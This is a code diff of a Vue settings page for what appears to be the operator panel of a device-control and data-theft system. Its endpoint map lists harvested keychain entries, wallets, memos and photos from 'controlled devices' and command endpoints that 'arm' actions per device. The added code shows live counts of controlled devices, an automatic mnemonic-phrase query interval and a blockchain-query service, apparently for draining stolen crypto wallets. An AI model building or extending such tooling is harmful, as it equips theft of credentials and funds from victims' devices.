@@ -1,15 +1,41 @@
 <script setup lang="ts">
-import { computed, onMounted } from 'vue'
+import { computed, onMounted, ref } from 'vue'
 import { useUiStore } from '@/stores/ui'
 import { useAuthStore } from '@/stores/auth'
 import { useDashStore } from '@/stores/dash'
 import { useCommandStore } from '@/stores/command'
+import { panelApi } from '@/api/panel'
+import { getApiBase, setApiBase, get } from '@/api/http'
 import { ElMessage } from 'element-plus'
 
 const ui = useUiStore()
 const auth = useAuthStore()
 const dash = useDashStore()
 const cmd = useCommandStore()
+
+/** 后端入口（人工设置）：空=同源；非空=独立部署/换端口/演练实例时手动指定 */
+const apiBase = ref(getApiBase())
+const testing = ref(false)
+const pageOrigin = location.origin
+
+function saveBase() {
+  setApiBase(apiBase.value)
+  ElMessage.success(apiBase.value.trim() ? `后端入口已设为 ${apiBase.value.trim()}` : '已恢复同源模式')
+}
+
+async function testBase() {
+  testing.value = true
+  const base = apiBase.value.trim().replace(/\/+$/, '')
+  const url = (base || location.origin) + '/__auth/me'
+  try {
+    const r = await fetch(url, { credentials: 'include' })
+    ElMessage[r.ok ? 'success' : 'warning'](`探测 ${url} → HTTP ${r.status}（401=在线但未登录，正常）`)
+  } catch {
+    ElMessage.error(`探测失败：${url} 无法连接`)
+  } finally {
+    testing.value = false
+  }
+}
 
 const intervals = [
   { label: '1 秒', value: 1000 },
@@ -20,18 +46,18 @@ const intervals = [
 
 /** 接口地图：按信息架构分组（业务实体 / 运营 / 指令 / 会话） */
 const apiMap = [
-  { g: '业务实体（入库解析）', p: '/api/data/memos', m: 'GET', d: '备忘录实体（nb 解析）' },
-  { g: '业务实体（入库解析）', p: '/api/data/wallets', m: 'GET', d: '钥匙串：按设备 → 钱包 → 条目' },
   { g: '业务实体（入库解析）', p: '/api/data/photos', m: 'GET', d: '照片实体（ph 包索引）' },
   { g: '业务实体（入库解析）', p: '/api/file/{packet_id}', m: 'GET', d: '原始字节流（照片预览/下载）' },
-  { g: '业务实体（入库解析）', p: '/panel/api/apps', m: 'GET', d: '应用资产（u 解析，分页检索）' },
+  { g: '业务实体（入库解析）', p: '/panel/api/apps', m: 'GET', d: '应用资产（u 解析，仅入库供钱包/WS 映射，界面不展示）' },
   { g: '业务实体（入库解析）', p: '/panel/api/notes', m: 'GET', d: '备忘录 DB 视图（分页检索）' },
   { g: '业务实体（入库解析）', p: '/panel/api/war', m: 'GET', d: '钥匙串平铺行（keychain items）' },
+  { g: '业务实体（入库解析）', p: '/panel/api/keychain/{devices,item/{id}}', m: 'GET', d: '钥匙串设备概览 / 单条详情' },
+  { g: '业务实体（入库解析）', p: '/panel/api/results', m: 'GET', d: '指令结果（result 解码落库）' },
   { g: '运营', p: '/__dash/api', m: 'GET', d: '主数据口：设备 / PE / 钱包 / 日志 / 访问 / 计数' },
   { g: '运营', p: '/panel/api/devices', m: 'GET', d: '设备台账' },
   { g: '运营', p: '/panel/api/progress', m: 'GET', d: '交付进度（阶段权重）' },
-  { g: '运营', p: '/panel/api/{access,visits}', m: 'GET', d: '访问审计 / 来访去重' },
-  { g: '运营', p: '/__q/timeline/{ip}', m: 'GET', d: '设备时间线' },
+  { g: '运营', p: '/panel/api/visits', m: 'GET', d: '来访去重 / 访问统计' },
+  { g: '运营', p: '/api/stats', m: 'GET', d: '仪表台 KPI' },
   { g: '指令', p: '/__control', m: 'GET', d: 'peek：全局队列 + 各设备队列总览' },
   { g: '指令', p: '/__control', m: 'POST', d: '{type,params,once,targets[]} 批量按设备武装' },
   { g: '指令', p: '/__control', m: 'POST', d: '{command:null,target} 只取消该设备待发' },
@@ -58,13 +84,52 @@ function resetLocal() {
   }
 }
 
+// ── 运行状态（实时透明）──
+type Any = Record<string, any>
+const st = ref<{ health?: Any; version?: Any; stats?: Any; wordsCfg?: Any; chains?: Any }>({})
+
+async function loadStatus() {
+  try { st.value.health = await get<Any>('/__health') } catch { st.value.health = undefined }
+  try { st.value.version = await get<Any>('/__version') } catch { st.value.version = undefined }
+  try { st.value.stats = await get<Any>('/api/stats') } catch { st.value.stats = undefined }
+  try { st.value.wordsCfg = await panelApi.wordsConfig() } catch { st.value.wordsCfg = undefined }
+  try { st.value.chains = await get<Any>('/panel/api/words/chains') } catch { st.value.chains = undefined }
+}
+
 onMounted(() => {
   void cmd.refreshTargets()
+  void loadStatus()
 })
 </script>
 
 <template>
   <div class="st">
+    <!-- 运行状态（实时透明） -->
+    <section class="app-card">
+      <div class="app-card__head">
+        <h3 class="app-card__title"><el-icon><Odometer /></el-icon>运行状态</h3>
+        <el-button size="small" @click="loadStatus">刷新</el-button>
+      </div>
+      <div class="app-card__body">
+        <dl class="stat-grid">
+          <div><dt>后端</dt><dd>
+            <span class="chip" :class="st.health?.db ? 'chip--ok' : 'chip--warn'">{{ st.health?.status || '不可达' }}</span>
+          </dd></div>
+          <div><dt>版本</dt><dd class="mono">{{ st.version?.version || '-' }} <span class="t-3">· schema v{{ st.version?.schema ?? '-' }}</span></dd></div>
+          <div><dt>运行时长</dt><dd>{{ st.health?.uptime_s ?? '-' }}s · goroutine {{ st.health?.goroutines ?? '-' }}</dd></div>
+          <div><dt>DB 连接池</dt><dd>open {{ st.health?.db_pool?.open ?? '-' }} / 用 {{ st.health?.db_pool?.in_use ?? '-' }} / 空闲 {{ st.health?.db_pool?.idle ?? '-' }}</dd></div>
+          <div><dt>受控设备</dt><dd>{{ st.stats?.managed ?? '-' }}（在线 {{ st.stats?.online ?? '-' }}）</dd></div>
+          <div><dt>访问设备</dt><dd>{{ st.stats?.visitors ?? '-' }}（今日 {{ st.stats?.visitors_today ?? '-' }}）</dd></div>
+          <div><dt>助记词自动查询</dt><dd>{{ st.wordsCfg?.interval_min ?? '-' }} 分钟</dd></div>
+          <div><dt>chainquery</dt><dd>
+            <span class="chip" :class="st.chains?.chains ? 'chip--ok' : 'chip--warn'">
+              {{ st.chains?.chains ? st.chains.chains.length + ' 链可用' : '不可达' }}
+            </span>
+          </dd></div>
+        </dl>
+      </div>
+    </section>
+
     <!-- 视图偏好 -->
     <section class="app-card">
       <div class="app-card__head">
@@ -103,6 +168,34 @@ onMounted(() => {
             <el-switch v-model="ui.collapsed" size="small" inline-prompt active-text="收起" inactive-text="展开" />
             <el-button link size="small" @click="resetLocal">清除本地偏好</el-button>
           </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 后端入口 -->
+    <section class="app-card">
+      <div class="app-card__head">
+        <h3 class="app-card__title"><el-icon><Link /></el-icon>后端入口</h3>
+        <span class="t-3" style="font-size: var(--fs-xs)">默认同源；独立部署前端时可人工指定</span>
+      </div>
+      <div class="app-card__body">
+        <div class="form">
+          <div class="form__row">
+            <span class="form__label">服务地址</span>
+            <el-input
+              v-model="apiBase"
+              size="small"
+              style="width: 320px"
+              placeholder="留空 = 同源（推荐），如 http://10.0.0.8:9100"
+              clearable
+            />
+            <el-button size="small" type="primary" @click="saveBase">保存</el-button>
+            <el-button size="small" :loading="testing" @click="testBase">连通探测</el-button>
+          </div>
+          <p class="t-3" style="font-size: var(--fs-xs); margin: 0">
+            当前生效：<span class="mono">{{ apiBase || '同源（' + pageOrigin + '）' }}</span>
+            。非同源时需后端 CORS 放行该前端 Origin；保存后所有请求即时切换，无需刷新。
+          </p>
         </div>
       </div>
     </section>
@@ -206,6 +299,22 @@ onMounted(() => {
   display: flex;
   flex-direction: column;
   gap: var(--sp-4);
+}
+.stat-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
+  gap: 10px 20px;
+  margin: 0;
+}
+.stat-grid dt {
+  font-size: var(--fs-xs);
+  color: var(--text-3);
+  margin-bottom: 2px;
+}
+.stat-grid dd {
+  margin: 0;
+  font-size: var(--fs-sm);
+  color: var(--text-1);
 }
 .two {
   grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
